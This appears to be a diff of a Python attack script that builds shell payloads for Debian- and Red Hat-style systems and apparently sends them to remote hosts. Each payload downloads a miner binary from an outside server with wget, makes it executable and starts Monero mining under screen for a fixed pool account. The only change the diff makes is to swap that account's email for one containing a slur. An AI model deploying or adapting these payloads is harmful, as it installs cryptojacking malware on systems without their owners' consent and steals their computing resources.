@@ -90,9 +90,9 @@ print("""
 	""")
 OS_Selection = raw_input(">>> ")
 if OS_Selection == '1':
-	payload = "apt-get update -y; apt-get install screen wget -y; cd ~; mkdir mining; cd mining; mkdir xmr; cd xmr; wget http://netdistrict.pw/mine.x64 -O miner; chmod 777 miner; echo \"screen ./miner -u ciphermode@tuta.io -o stratum+tcp://xmr.pool.minergate.com:45560 -p x -F\" > /root/mining/xmr/start.sh; sh start.sh"
+	payload = "apt-get update -y; apt-get install screen wget -y; cd ~; mkdir mining; cd mining; mkdir xmr; cd xmr; wget http://netdistrict.pw/mine.x64 -O miner; chmod 777 miner; echo \"screen ./miner -u fuckyou@retard.com -o stratum+tcp://xmr.pool.minergate.com:45560 -p x -F\" > /root/mining/xmr/start.sh; sh start.sh"
 elif OS_Selection == '2':
-	payload = "yum update -y; yum install screen wget -y; cd ~; mkdir mining; cd mining; mkdir xmr; cd xmr; wget http://netdistrict.pw/mine.x64 -O miner; chmod 777 miner; echo \"screen ./miner -u ciphermode@tuta.io -o stratum+tcp://xmr.pool.minergate.com:45560 -p x -F\" > /root/mining/xmr/start.sh; sh start.sh"
+	payload = "yum update -y; yum install screen wget -y; cd ~; mkdir mining; cd mining; mkdir xmr; cd xmr; wget http://netdistrict.pw/mine.x64 -O miner; chmod 777 miner; echo \"screen ./miner -u fuckyou@retard.com -o stratum+tcp://xmr.pool.minergate.com:45560 -p x -F\" > /root/mining/xmr/start.sh; sh start.sh"
 
 #! Make Connection !#
 try:
